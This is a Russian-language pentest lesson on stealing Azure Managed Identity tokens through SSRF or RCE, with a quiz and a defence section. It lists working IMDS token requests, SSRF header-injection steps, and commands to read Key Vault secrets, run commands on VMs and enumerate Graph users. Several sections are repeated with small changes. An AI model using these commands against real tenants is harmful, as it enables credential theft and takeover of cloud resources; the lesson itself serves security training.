---
id: cloud-azure-managed-identity
title: "Azure Managed Identity и IMDS: от SSRF до токена ресурса"
category: cloud
parent: cloud-metadata-ssrf
difficulty: expert
order: 1
tags: [cloud, azure, managed-identity, imds, ssrf, token, entra-id]
prerequisites: [cloud-azure-basics, cloud-metadata-ssrf]
useful_for:
  - "Эксплуатация SSRF/RCE на Azure-ресурсах"
  - "Захват managed identity и последующая эскалация"
  - "Пентест App Service, Functions, AKS, VM"
estimated_minutes: 35
summary: "Как устроен endpoint managed identity в Azure, чем отличается IMDS от IMDSv2 в AWS, и как через SSRF/RCE получить токен, определить его права и пройти в Key Vault, ARM и Graph."
---

## Зачем этот урок

В Azure нет «роли на инстансе» в AWS-смысле — есть **Managed Identity (MI)**: автоматически управляемая идентичность, привязанная к ресурсу. Токен выдаёт локальный endpoint `169.254.169.254` (IMDS). Любая SSRF или RCE на Azure-ресурсе (App Service, Function, VM, AKS pod) превращается в кражу токена, а токен — в доступ к ресурсам, на которые у MI хватает прав.

## Как устроен endpoint

Базовая выдача токена (system-assigned MI):

```bash
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Ответ — JSON:

```json
{
  "access_token": "eyJ0eXAiOiJKV1...",
  "expires_on": "1730000000",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

Ключевые параметры:

| Параметр | Значение | Комментарий |
|----------|----------|-------------|
| `Metadata: true` | обязательный заголовок | Защита от простого SSRF-редиректа |
| `api-version` | `2018-02-01` (стабильная) | Есть и более новые |
| `resource` | audience | Определяет, куда годится токен |
| `client_id` | опционально | Выбрать конкретную user-assigned MI |

Частые `resource`:

- `https://management.azure.com/` — ARM (управление ресурсами).
- `https://vault.azure.net` — Key Vault (секреты).
- `https://graph.microsoft.com/` — Microsoft Graph (каталог).
- `https://storage.azure.com/` — Storage data plane.
- `https://database.windows.net/` — Azure SQL.

## Важное отличие от AWS

- В Azure **нет** «простого» unauthenticated IMDS-пути, как `http://169.254.169.254/latest/meta-data/iam/...` в AWS. Но заголовок `Metadata: true` — слабая защита: если SSRF позволяет задать произвольный заголовок, он легко добавляется.
- MI endpoint доступен **не только на VM**, но и внутри App Service, Functions, Container Apps, AKS (через workload identity). То есть SSRF в веб-приложении часто даёт токен.
- Токен — JWT; его можно декодировать и посмотреть `oid` (object id), `roles`, `appid`, `aud`.

## Разведка по токену

Получив токен, сначала поймите, **кто вы и что можете**:

```bash
export TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)

# Декодировать payload JWT
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Какие подписки видит эта идентичность
az rest --method GET --url "https://management.azure.com/subscriptions?api-version=2020-01-01" \
  --headers "Authorization=Bearer $TOKEN"

# Какие роли
az rest --method GET \
  --url "https://management.azure.com/subscriptions/<SUB>/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  --headers "Authorization=Bearer $TOKEN"
```

## Разобранный пример: SSRF → Key Vault

Сценарий: Azure App Service с включённой system-assigned MI; в приложении есть SSRF, позволяющий задавать URL и заголовки.

1. **Проверяем SSRF** на внутренний endpoint:
   ```
   GET /fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
   ```
   Если видим JSON с `compute` — SSRF есть, но нужен заголовок `Metadata: true`.

2. **Добавляем заголовок** (если SSRF поддерживает заголовки или можно использовать CRLF-инъекцию):
   ```
   GET /fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://vault.azure.net
   Header: Metadata: true
   ```
   Получаем `access_token` для Key Vault.

3. **Читаем секреты**:
   ```bash
   curl -s -H "Authorization: Bearer $KV_TOKEN" \
     "https://myvault.vault.azure.net/secrets?api-version=7.3"
   curl -s -H "Authorization: Bearer $KV_TOKEN" \
     "https://myvault.vault.azure.net/secrets/db-password?api-version=7.3"
   ```

4. **Эскалация**: если MI имеет `Contributor` на подписке, создаём новую VM или выполняем `RunCommand` на существующей:
   ```bash
   az rest --method POST \
     --url "https://management.azure.com/subscriptions/<SUB>/resourceGroups/<RG>/providers/Microsoft.Compute/virtualMachines/<VM>/runCommand?api-version=2023-03-01" \
     --headers "Authorization=Bearer $ARM_TOKEN" \
     --body '{"commandId":"RunShellScript","script":["id; whoami"]}'
   ```

5. **Захват Graph**: если MI имеет согласованные Graph permissions, получаем токен `resource=https://graph.microsoft.com/` и перечисляем каталог:
   ```bash
   curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
     "https://graph.microsoft.com/v1.0/users?\$top=999"
   ```

## Где живёт MI: App Service, Functions, AKS

- **App Service / Functions** — MI endpoint доступен по тому же `169.254.169.254`; часто `IDENTITY_ENDPOINT`/`IDENTITY_HEADER` прокидываются в переменные окружения. Читайте env — иногда endpoint и токен уже там:
  ```bash
  env | grep -i -E "IDENTITY|MSI|AZURE"
  ```
- **AKS с workload identity** — токен приходит через projected service account token и federation с Azure AD; ищите `/var/run/secrets/azure/tokens/azure-identity-token`.
- **VM** — classic IMDS; иногда доступен и старый `MSI_ENDPOINT`.

## Частые ошибки

- **Забыть заголовок `Metadata: true`.** Без него IMDS отвечает ошибкой — многие решают, что «MI нет».
- **Не перебрать audience.** MI может иметь права только в Key Vault, но не в ARM. Пробуйте все релевантные `resource`.
- **Не проверить user-assigned MI.** У ресурса может быть несколько MI; выбирайте нужную через `client_id=`.
- **Считать токен одноразовым.** Токен живёт ~8 часов — сохраните его и работайте без повторного SSRF.
- **Игнорировать вывод JWT.** `roles` в токене часто сразу говорят, что вам доступно, без обращения к API.

## Endpoint и команды

Managed Identity отдаёт токен через IMDS Azure:

```bash
curl -s -H "Metadata: true" \
 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
# {"access_token":"eyJ...","expires_in":"86399",...}
```

`resource` — целевой сервис (Key Vault, Storage, ARM, Graph). Один токен — один ресурс.

## Отличие от AWS

- Токен выдаётся на конкретный `resource`, а не «на всё».
- Есть `client_id`/`object_id` для выбора identity, если их несколько.
- App Service/Functions имеют `IDENTITY_ENDPOINT`/`IDENTITY_HEADER` в env — более удобный путь, чем IMDS.
- AKS использует workload identity federation (не IMDS).

## Разведка по токену

```bash
az account get-access-token --resource https://management.azure.com
az rest --url "https://management.azure.com/subscriptions?api-version=2020-01-01"
az role assignment list --assignee <object-id>
```

По токену определяйте object id и его роли — это карта прав.

## Разобранный пример 2: SSRF → Key Vault

1. Приложение на App Service уязвимо к SSRF.
2. Через SSRF читаем `IDENTITY_ENDPOINT` с `IDENTITY_HEADER`.
3. Получаем токен на `https://vault.azure.net`.
4. Читаем секреты Key Vault: `az keyvault secret show`.
5. Секреты → БД/API → расширение доступа.

## Практическое задание

Создайте App Service с system-assigned identity и доступом к Key Vault. Через SSRF-эмуляцию получите токен и прочитайте секрет. Затем сузьте права identity до минимума и повторите — доступ должен пропасть.

## Где живёт Managed Identity

- **App Service / Functions**: env `IDENTITY_ENDPOINT` + `IDENTITY_HEADER`.
- **Azure VM / VMSS**: IMDS `169.254.169.254`.
- **AKS**: workload identity federation через projected token.
- **Container Apps / ACI**: IMDS или env.
System-assigned identity удаляется с ресурсом; user-assigned живёт отдельно и переиспользуется. Проверьте, какие роли назначены (`az role assignment list --assignee <object-id>`).

## Защита

- Минимум ролей у identity (не Owner/Contributor).
- Ограничение сетевого доступа к Key Vault (firewall, private endpoint).
- Аудит использования identity (Azure Monitor, diagnostic settings).
- Не возвращать токены наружу через SSRF (валидация URL, allow-list).

## Итог

Managed Identity — удобный, но мощный механизм: токен к любому ресурсу без пароля. Через SSRF или доступ к env вы получаете роли identity. Минимизируйте роли, ограничивайте сетевой доступ к Key Vault и валидируйте URL в приложениях, чтобы SSRF не превращался в кражу секретов.

## Выбор identity при нескольких

Если у ресурса несколько user-assigned identities, токен можно запросить для конкретной через параметры `client_id`/`object_id`:

```bash
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net&client_id=<id>"
```

Переберите все identity — часто одна из них имеет широкие роли. Это важный шаг разведки в Azure.

## Квиз

```quiz
- question: "Какой обязательный заголовок требует IMDS-токен managed identity в Azure?"
  options:
    - "Authorization: Bearer"
    - "Metadata: true"
    - "X-Azure-Token"
    - "Content-Type: application/json"
  answer: 1
  explanation: "Заголовок Metadata: true отличает легитимный запрос от простого SSRF-редиректа."
- question: "Что определяет параметр resource в запросе токена?"
  options:
    - "Регион Azure"
    - "Audience токена — куда этот токен можно предъявить"
    - "Имя виртуальной машины"
    - "Пароль managed identity"
  answer: 1
  explanation: "resource задаёт audience: management.azure.com, vault.azure.net, graph.microsoft.com и т.д."
- question: "Почему managed identity доступна не только на VM?"
  options:
    - "Потому что MI — это просто пароль"
    - "Потому что MI поддерживают App Service, Functions, Container Apps и AKS, где тоже есть endpoint 169.254.169.254"
    - "Потому что она встроена в браузер"
    - "Она доступна только на VM"
  answer: 1
  explanation: "MI привязывается к ресурсу любого типа, и endpoint доступен из его контекста."
- question: "Где в App Service иногда уже лежит endpoint managed identity без SSRF?"
  options:
    - "В файле /etc/passwd"
    - "В переменных окружения IDENTITY_ENDPOINT и IDENTITY_HEADER"
    - "В cookie"
    - "В DNS-записи"
  answer: 1
  explanation: "App Service прокидывает IDENTITY_ENDPOINT/IDENTITY_HEADER в окружение приложения."
- question: "Что первым делом стоит сделать с полученным токеном, чтобы понять его права?"
  options:
    - "Удалить его"
    - "Декодировать JWT и посмотреть роли/aud"
    - "Отправить на внешний сервер"
    - "Сменить пароль пользователя"
  answer: 1
  explanation: "Payload JWT содержит oid, roles, appid, aud — это карта ваших возможностей."
```

## Где пригодится

- **Пентест Azure** — SSRF/RCE на App Service, Functions, AKS.
- **Red team** — тихий захват ресурсов через MI.
- **Bug bounty** — облачные приложения на Azure.
- **IR/Blue team** — детект выдачи токенов и аномальных вызовов ARM/Graph.
- **DevSecOps** — минимизация прав MI.
